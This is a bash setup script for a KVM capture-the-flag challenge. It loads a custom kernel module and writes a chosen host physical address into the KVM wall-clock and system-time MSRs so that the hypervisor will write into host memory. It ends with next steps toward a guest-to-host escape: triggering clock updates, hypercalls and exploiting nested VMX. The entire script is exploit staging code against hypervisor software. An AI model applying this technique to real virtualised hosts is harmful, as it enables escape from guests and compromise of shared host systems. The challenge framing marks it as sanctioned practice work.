#!/bin/bash
# KVM CTF Quick Setup Script
# Run this after connecting to get back to exploitation state

set -e

echo "[*] KVM CTF Quick Setup"
echo "[*] Target: write_flag @ host virtual 0xffffffff826279a8 / physical 0x64279a8"

# Navigate to working directory
cd ~/kvm_probin/test

# Load the kernel module if not loaded
if ! lsmod | grep -q kvm_probe; then
    echo "[*] Loading kernel module..."
    insmod ../kvm_probe.ko
fi

# Verify module is working
echo "[*] Testing module..."
./probe msr 0x4b564d00

# Set up the attack - write host physical address to KVM MSRs
echo "[*] Setting wall clock MSR to host address 0x64279a8..."
./probe write_msr 0x4b564d00 0x64279a8

echo "[*] Setting system time MSR to host address 0x64279a9..."
./probe write_msr 0x4b564d01 0x64279a9

# Verify the MSRs are set
echo "[*] Verifying MSR values..."
./probe msr 0x4b564d00
./probe msr 0x4b564d01
./probe msr 0x4b564d02

# Show current state
echo ""
echo "[+] Setup complete. Current state:"
echo "    - KVM_MSR_WALL_CLOCK (0x4b564d00) -> 0x64279a8 (host phys)"
echo "    - KVM_MSR_SYSTEM_TIME (0x4b564d01) -> 0x64279a9 (host phys)"
echo ""
echo "[*] Key info:"
echo "    - Guest kernel: 6.1.0-21-amd64 (nokaslr, tsx=on)"
echo "    - Nested VMX: enabled"
echo "    - Target: write to host 0x64279a8 or read /root/rce_flag"
echo ""
echo "[*] Next steps to try:"
echo "    1. Trigger clock update to make KVM write to our address"
echo "    2. Try hypercalls (need to add support)"
echo "    3. Exploit nested VMX"
